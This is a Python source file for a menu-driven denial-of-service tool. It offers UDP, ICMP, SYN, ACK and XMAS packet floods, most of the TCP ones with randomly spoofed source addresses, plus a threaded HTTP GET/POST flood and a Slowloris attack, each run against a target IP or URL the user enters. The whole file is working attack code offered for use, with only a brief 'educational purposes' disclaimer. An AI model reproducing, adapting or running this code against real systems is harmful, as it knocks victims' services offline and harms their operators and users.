import os
import random
import time
import requests
import threading
from urllib.parse import urlparse
from scapy.all import IP, send, Raw, UDP, TCP, sr1, ICMP
from colorama import Fore, Style, init
import socket

init()

# Function to handle returning to the main menu
def tap_to_continue():
    input(Style.BRIGHT + Fore.MAGENTA + "\nTap to continue..." + Style.RESET_ALL)

# Customized main menu with colors
def main_menu():
    print(Style.BRIGHT + Fore.YELLOW + """
     _______   _____    _____    _    
    (_______) (____ \  / ___ \  | |   
     _____ ___ _   \ \| |   | |  \ \  
    |  ___|___) |   | | |   | |   \ \     by Eyna
    | |       | |__/ /| |___| |____) )
    |_|       |_____/  \_____(______/ 
                                      
    """ + Style.RESET_ALL)

    print(Style.BRIGHT + Fore.RED +"""
    [!] Welcome to my DOS Attack tool
      
    [*] This program is for educational purposes and any misuse is the user's responsibility.
    
    [!] MAKE SURE YOU RUN THIS TOOL AS ADMINISTRATOR/ROOT 
    """ + Style.RESET_ALL)

    print(Style.BRIGHT + Fore.WHITE + "[Choose Your Option] " + Style.RESET_ALL + Style.BRIGHT + """
    ---------------
    """ + Fore.GREEN + """              
    [1] DOS Attacks
    [2] NMAP *(Coming soon...)
    """ + Style.RESET_ALL + """
    --------------- 
    """ + Style.BRIGHT + Fore.CYAN + "[*] Your choice: " + Style.RESET_ALL, end='')

# DOS Attack menu with colors
def dos_menu():
    print(Style.BRIGHT + Fore.CYAN + """
    ----------------------
    [1] UDP Flood
    [2] ICMP Flood
    [3] SYN Flood
    [4] ACK Flood
    [5] XMAS Flood
    [6] HTTP GET/POST Flood
    [7] Slow Loris
    ----------------------
    """ + Style.RESET_ALL)
    return input(Fore.YELLOW + "[*] Choose Your Attack Type: " + Style.RESET_ALL)

# DOS attack functions with "Tap to continue" prompt
def UDP_flood(UDP_flood_ip, UDP_flood_Port, UDP_flood_time):
    payload = random._urandom(1024)
    timeout = time.time() + UDP_flood_time
    sent_packets = 0

    while time.time() < timeout:
        src_port = random.randint(1024, 65535)
        packet = IP(dst=UDP_flood_ip) / UDP(sport=src_port, dport=UDP_flood_Port) / Raw(load=payload)
        send(packet, verbose=False)
        sent_packets += 1
        print(f"Sent {sent_packets} Packets to {UDP_flood_ip}:{UDP_flood_Port}")

    print(Fore.GREEN + "UDP flood attack completed." + Style.RESET_ALL)
    tap_to_continue()

def syn_flood(SYN_target_ip, SYN_target_port, SYN_packet_count):
    print(f"Starting SYN flood attack on {SYN_target_ip}:{SYN_target_port} with {SYN_packet_count} packets...")

    for i in range(SYN_packet_count):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        ip_packet = IP(src=src_ip, dst=SYN_target_ip)
        tcp_packet = TCP(sport=src_port, dport=SYN_target_port, flags="S")
        send(ip_packet/tcp_packet, verbose=False)
        if i % 100 == 0:
            print(f"[+] Sent {i+1}/{SYN_packet_count} packets")

    print(Fore.GREEN + "SYN flood attack completed." + Style.RESET_ALL)
    tap_to_continue()

def icmp_flood(target_ip, packet_count, payload_size):
    payload = "A" * payload_size
    packet = IP(dst=target_ip) / ICMP() / Raw(load=payload)
    
    for i in range(packet_count):
        send(packet, verbose=0)
        print(f"Packet {i+1} sent with payload size {payload_size} bytes")

    print(Fore.GREEN + "ICMP flood attack completed." + Style.RESET_ALL)
    tap_to_continue()

def ack_flood(ACK_target_ip, ACK_target_port, ACK_packet_count):
    print(f"Starting ACK flood attack on {ACK_target_ip}:{ACK_target_port} with {ACK_packet_count} packets...")

    for i in range(ACK_packet_count):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        ip_packet = IP(src=src_ip, dst=ACK_target_ip)
        tcp_packet = TCP(sport=src_port, dport=ACK_target_port, flags="A")
        send(ip_packet/tcp_packet, verbose=False)
        if i % 100 == 0:
            print(f"[+] Sent {i+1}/{ACK_packet_count} packets")

    print(Fore.GREEN + "ACK flood attack completed." + Style.RESET_ALL)
    tap_to_continue()

def HTTP_flood():
    url = input("Enter the target URL: ")
    request_count = int(input("Enter the number of requests to send: "))
    post_data = {"title": "NULL NULL NULL NULL NULL NULL", "RAEAL": "BATMAN BATMAN BATMAN BATMAN BATMAN BATMAN"}

    def send_get_request(request_id):
        try:
            response = requests.get(url)
            print(f"[GET] Request #{request_id} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[GET] Error during request #{request_id}: {e}")

    def send_post_request(request_id):
        try:
            response = requests.post(url, json=post_data)
            print(f"[POST] Request #{request_id} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[POST] Error during request #{request_id}: {e}")

    threads = []
    for i in range(request_count):
        thread = threading.Thread(target=send_get_request if i % 2 == 0 else send_post_request, args=(i+1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.GREEN + f"Completed sending {request_count} requests to {url}." + Style.RESET_ALL)
    tap_to_continue()

def xmas_flood(XMAS_target_ip, XMAS_target_port, XMAS_packet_count):
    print(f"Starting Xmas flood attack on {XMAS_target_ip}:{XMAS_target_port} with {XMAS_packet_count} packets...")

    for i in range(XMAS_packet_count):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        ip_packet = IP(src=src_ip, dst=XMAS_target_ip)
        tcp_packet = TCP(sport=src_port, dport=XMAS_target_port, flags="FPU")
        send(ip_packet/tcp_packet, verbose=False)
        if i % 100 == 0:
            print(f"[+] Sent {i+1}/{XMAS_packet_count} packets")

    print(Fore.GREEN + "Xmas flood attack completed." + Style.RESET_ALL)
    tap_to_continue()

def slowloris_attack(url, num_connections=100, interval=10):
    parsed_url = urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    addr_info = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)

    def slowloris_connection(family, sockaddr):
        try:
            src_port = random.randint(1024, 65535)
            syn_packet = IP(dst=sockaddr[0]) / TCP(sport=src_port, dport=port, flags='S', seq=1000)
            syn_ack_packet = sr1(syn_packet, timeout=2)
            if not syn_ack_packet:
                print(f"No response from {sockaddr[0]}. Aborting connection.")
                return

            ack_packet = IP(dst=sockaddr[0]) / TCP(sport=src_port, dport=port, flags='A',
                                                  seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
            send(ack_packet)
            print(f"Established TCP connection with {sockaddr[0]} on port {port}")

            request = f"GET {parsed_url.path or '/'} HTTP/1.1\r\nHost: {host}\r\n"
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.connect(sockaddr)
            sock.send(request.encode('utf-8'))

            while True:
                time.sleep(interval)
                sock.send(b"X-a: b\r\n")
                print(f"Sent keep-alive headers to {sockaddr[0]}:{port}")
        except Exception as e:
            print(f"Error in connection: {e}")

    threads = []
    for _ in range(num_connections):
        family, _, _, _, sockaddr = random.choice(addr_info)
        thread = threading.Thread(target=slowloris_connection, args=(family, sockaddr))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.GREEN + "Slowloris attack completed." + Style.RESET_ALL)
    tap_to_continue()

# Main program loop with menu
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    main_menu()
    choice = input().strip()

    if choice == '1':
        os.system('cls' if os.name == 'nt' else 'clear')
        attack_choice = dos_menu()

        if attack_choice == '1':
            UDP_flood_ip = input(Fore.CYAN + "Enter Target IP: " + Style.RESET_ALL)
            UDP_flood_Port = int(input(Fore.CYAN + "Enter Target Port: " + Style.RESET_ALL))
            UDP_flood_time = int(input(Fore.CYAN + "Enter Duration (in seconds): " + Style.RESET_ALL))
            UDP_flood(UDP_flood_ip, UDP_flood_Port, UDP_flood_time)

        elif attack_choice == '2':
            ICMP_target_ip = input(Fore.CYAN + "Enter Target IP: " + Style.RESET_ALL)
            ICMP_packet_count = int(input(Fore.CYAN + "Enter Number of Packets: " + Style.RESET_ALL))
            ICMP_payload_size = int(input(Fore.CYAN + "Enter Payload Size (bytes): " + Style.RESET_ALL))
            icmp_flood(ICMP_target_ip, ICMP_packet_count, ICMP_payload_size)

        elif attack_choice == '3':
            SYN_target_ip = input(Fore.CYAN + "Enter Target IP: " + Style.RESET_ALL)
            SYN_target_port = int(input(Fore.CYAN + "Enter Target Port: " + Style.RESET_ALL))
            SYN_packet_count = int(input(Fore.CYAN + "Enter Number of Packets: " + Style.RESET_ALL))
            syn_flood(SYN_target_ip, SYN_target_port, SYN_packet_count)

        elif attack_choice == '4':
            ACK_target_ip = input(Fore.CYAN + "Enter Target IP: " + Style.RESET_ALL)
            ACK_target_port = int(input(Fore.CYAN + "Enter Target Port: " + Style.RESET_ALL))
            ACK_packet_count = int(input(Fore.CYAN + "Enter Number of Packets: " + Style.RESET_ALL))
            ack_flood(ACK_target_ip, ACK_target_port, ACK_packet_count)

        elif attack_choice == '5':
            XMAS_target_ip = input(Fore.CYAN + "Enter Target IP: " + Style.RESET_ALL)
            XMAS_target_port = int(input(Fore.CYAN + "Enter Target Port: " + Style.RESET_ALL))
            XMAS_packet_count = int(input(Fore.CYAN + "Enter Number of Packets: " + Style.RESET_ALL))
            xmas_flood(XMAS_target_ip, XMAS_target_port, XMAS_packet_count)

        elif attack_choice == '6':
            HTTP_flood()

        elif attack_choice == '7':
            slowloris_url = input(Fore.CYAN + "Enter Target URL: " + Style.RESET_ALL)
            slowloris_connections = int(input(Fore.CYAN + "Enter Number of Connections: " + Style.RESET_ALL))
            slowloris_interval = int(input(Fore.CYAN + "Enter Interval (in seconds): " + Style.RESET_ALL))
            slowloris_attack(slowloris_url, slowloris_connections, slowloris_interval)

        else:
            print(Fore.RED + "Invalid Option! Returning to Main Menu..." + Style.RESET_ALL)
            tap_to_continue()

    elif choice == '2':
        # Implement the NMAP functionality or call relevant functions
        pass

    else:
        print(Fore.RED + "Invalid Option! Exiting..." + Style.RESET_ALL)
        break
